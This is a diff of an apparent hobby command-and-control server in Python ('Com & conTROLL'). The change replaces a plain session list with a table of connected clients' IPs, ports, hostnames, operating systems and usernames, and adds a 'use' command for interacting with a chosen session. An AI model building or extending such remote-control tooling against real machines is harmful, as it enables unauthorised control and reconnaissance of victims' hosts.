@@ -3,13 +3,14 @@ import socket
 import threading
 import sys
 import time
+from prettytable import PrettyTable
 
 connections = []
 
 tprint("Com & conTROLL")
 
 SERVER_HOST = '127.0.0.1'
-SERVER_PORT = 5151
+SERVER_PORT = 5050
 
 server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 
@@ -21,16 +22,22 @@ server_socket.listen(5)
 # print(f"Server listening on {SERVER_HOST}:{SERVER_PORT}")
 
 def list():
-    num = 0
-    for connection in connections:
-        print(f'\n[{num}]  {connection['address']}\n')
-        num += 1 
+    table = PrettyTable(["ID", "IP", "port", 'Hostname', 'OS', 'Username'])
+
+    for i in range(len(connections)):
+        table.add_row([i,connections[i]['address'][0],connections[i]['address'][1],connections[i]['cred']['hostname'],
+        connections[i]['cred']['OS'],connections[i]['cred']['username']])
+
+    print(table)
+    
     print("use number for interaction with socket. For example 'use 0'")  #MAKE HERE BEAUTIFUL
 
-    print(connections)
+    # print(connections)
+
 
 def help():
     print("list\nuse\nexit")
+
 
 def use(session):
     session = int(session)
